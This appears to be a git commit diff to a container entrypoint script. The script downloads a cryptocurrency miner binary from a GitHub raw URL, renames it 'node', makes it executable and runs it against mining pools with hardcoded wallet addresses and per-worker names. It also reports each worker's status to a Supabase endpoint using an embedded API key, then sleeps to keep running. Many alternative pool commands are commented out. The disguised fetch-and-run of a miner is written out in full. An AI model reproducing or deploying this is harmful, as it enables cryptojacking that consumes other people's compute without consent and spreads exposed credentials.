eb5a2646e7e9d5c93dec1dbdefd76857eab42835
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-17 21:18:02 +0700

    Update entrypoint.sh

--- 1/entrypoint.sh
+++ 1/entrypoint.sh
@@ -1,42 +1,34 @@
 #!/bin/sh
+# SRBMiner
+ curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+# cNfj5q6A7c4yM3KD
+
+# xmr
+# curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+
+chmod +x node
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 
-# opt
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx2/node
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx512-sha-vaes/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/ryzen/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse2/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse2amd/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse42/node
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse42-aes/node
 
-# SRBMiner
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
-
-# xmr
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
-
-
-chmod +x node
-
-# supabase.co 
 PROJECT="plyyisutdhzkhyxowznt"
 APIKEY="sb_publishable_BpW4yiofh6uN0lZ_2fl1Sg_BXIYS5LO"
 URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
 
 # Ambil waktu WIB (UTC+7)
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crt_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
 
 echo "start ${WORKER_NUMBER}"
 
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-./node -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 > try.log
+# ./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1.5 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Crionic
-# ./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p id=crf_${WORKER_NUMBER},c=CRNC,m=solo,d=0.2 --cpu-threads-intensity 4 --miner-priority 4 > try.log
+#./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
+#./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
+#./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.bet_${WORKER_NUMBER} -p id=bet_${WORKER_NUMBER},c=CRNC,m=solo,d=0.2 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Whive
 #./node --disable-gpu -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1q234xlrqlgykkz628xn3ehv9h6ssr55l4sqr0m2.${WORKER_NUMBER}_crf > try.log
 #./node --disable-gpu -a yespower -o stratum+tcp://stratum.aikapool.com:3933 -u chriskm0101.${WORKER_NUMBER}_crf -p x,pgid=chriskm0101 > try.log
@@ -45,6 +37,5 @@ echo "start ${WORKER_NUMBER}"
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
 # salvium
-#./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} > try.log
+# ./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${WORKER_NUMBER} > try.log
 sleep 29999
-
